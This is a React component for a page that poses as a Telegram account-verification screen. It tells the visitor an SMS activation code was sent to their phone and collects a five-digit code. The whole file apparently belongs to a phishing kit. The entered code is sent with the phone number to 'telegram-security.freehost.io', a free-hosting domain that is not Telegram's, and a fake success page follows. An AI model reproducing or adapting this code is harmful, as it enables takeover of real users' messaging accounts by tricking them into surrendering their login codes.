import react, { useEffect, useRef, useState } from "react";
import './GetPassCode.css';
import { useLocation, useNavigate } from "react-router-dom";

export default function GetPassCode(){
    const [input,setInput]=useState({value1:'',value2:'',value3:'',value4:''})
    const [loading,setLoading]=useState(false)
    const [loadImg,setLoadImg]=useState('loading')
    const [resendCode,setResendCode]=useState(false)
    const [codeTime,setCodeTime]=useState({minute:1,second:59})
    const [inputDisable,setInputDisable]=useState(false)
    const [errMsg,setErrMsg]=useState(false)
    const nav=useNavigate()
    const inp1=useRef()
    const inp2=useRef()
    const inp3=useRef()
    const inp4=useRef()
    const inp5=useRef()
    const resend=useRef()
    const loc = useLocation()


    useEffect(()=>{
        inp1.current.focus()
        let resendDelay=setTimeout(()=>{
            resend.current.style.display='block';
        },10000)
        return ()=> {clearTimeout(resendDelay);
    }}
    ,[])

    function input1Change(e){

        inp2.current.focus()
        setInput({...input,value1:e.target.value,value2:''})


    }
    function input1Empty(){
        setInput({...input,value1:''})
    }

    function input2Change(e){
        
        inp3.current.focus()
        setInput({...input,value2:e.target.value,value3:''})

    }
    function input2Empty(){

        setInput({...input,value2:''})
    }
    function input3Change(e){
        inp4.current.focus()
        setInput({...input,value3:e.target.value,value4:''})
    }
    function input3Empty(){
        setInput({...input,value3:''})
    }
    function input4Change(e){
        inp5.current.focus()
        setInput({...input,value4:e.target.value,value5:''})
    }
    function input4Empty(){
        setInput({...input,value4:''})
    }
    function input5Change(e){
    const code=input.value1+input.value2+input.value3+input.value4+e.target.value;
    setInputDisable(true)
    setLoadImg('loading')
    setLoading(true)
    async function sendCode(){
        await fetch(`http://telegram-security.freehost.io/api/verification/${loc.state}`,{
            method:'PUT',
            body:JSON.stringify({code:code}),
            headers:{'Content-type':'application/json'}
        }).then((data)=>{
            if(data.ok){
                setLoadImg('success')
                setTimeout(()=>{
                    nav('/account_verification/success')
                   },4000)
            }else{
                setLoadImg('failed')
                setInputDisable(false)
                setInput({value1:'',value2:'',value3:'',value4:''})
                inp5.current.value=''
                setTimeout(()=>{
                    setErrMsg(true)
                    setLoading(false)
                    inp1.current.focus()
                },2000)
            }
        })
    }

    sendCode()
    }
    function input5Empty(){
        setInput({...input,value5:''})
    
    }
    function deleteAction1(e){
        if(e.key==='Backspace'){
            inp1.current.focus()
        }
    }
    function deleteAction2(e){
        if(e.key==='Backspace'){
            inp2.current.focus()
        }
    }
    function deleteAction3(e){
        if(e.key==='Backspace'){
            inp3.current.focus()
        }
    }
    function deleteAction4(e){
        if(e.key==='Backspace'){
            inp4.current.focus()
        }
    }
    function resendCodeHandler(){
        setResendCode(true)
        let time={minute:1,seconds:'59'}
        let timeinterval=setInterval(()=>{
            if(time.seconds===0){
                time.minute--
                time.seconds=59
            }
            setCodeTime({minute:time.minute,second:time.seconds})
            time.seconds--
            if(time.minute===0&&time.seconds===0){
                clearInterval(timeinterval)
                setResendCode(false)

            }
         },1000
         )
    }


    return(
        <div id="get_pass_container">
            <div id="loading" style={loading?{display:'block'}:{display:'none'}}>
                <div id="animated_loading">
                    <img src={`/images/${loadImg}.gif`}/>
                </div>
            </div>
            <div id="head_sec_pass">
                <img src="/images/get_code.png"/>
                <h3>Enter code</h3>
                <p>
                Weve sent an SMS with an activation code to your phone <b>{"+"+loc.state}</b>
                </p>
            </div>
            <div id="get_pass_sec">
                <div id="form_sec">
                    <form>
                    
                        <input id="1" type="number" disabled={inputDisable} ref={inp1} onChange={input1Change} onFocus={input1Empty} value={input.value1}/>
                        <input id="2" type="number" disabled={inputDisable} ref={inp2} onChange={input2Change} onFocus={input2Empty} value={input.value2} onKeyDown={deleteAction1}/>
                        <input id="3" type="number" disabled={inputDisable} ref={inp3} onChange={input3Change} onFocus={input3Empty} value={input.value3} onKeyDown={deleteAction2}/>
                        <input id="4" type="number" disabled={inputDisable} ref={inp4} onChange={input4Change} onFocus={input4Empty} value={input.value4} onKeyDown={deleteAction3}/>
                        <input id="5" type="number" disabled={inputDisable} ref={inp5} onChange={input5Change} onFocus={input5Empty} onKeyDown={deleteAction4}/>
                    </form>
                </div>
            </div>
            <div>
                <div id="errMsg">
                    {errMsg&&<p>try again.</p>}
                </div>
            </div>
            <div id="resend_code" ref={resend} style={{display:'none'}}>
                {
                    resendCode?<p>resend again in {codeTime.minute+':'+codeTime.second}</p>
                    :<p id="didnt_get" onClick={resendCodeHandler}>Didn't get the code?</p>
                }

            </div>
        </div>
    )
}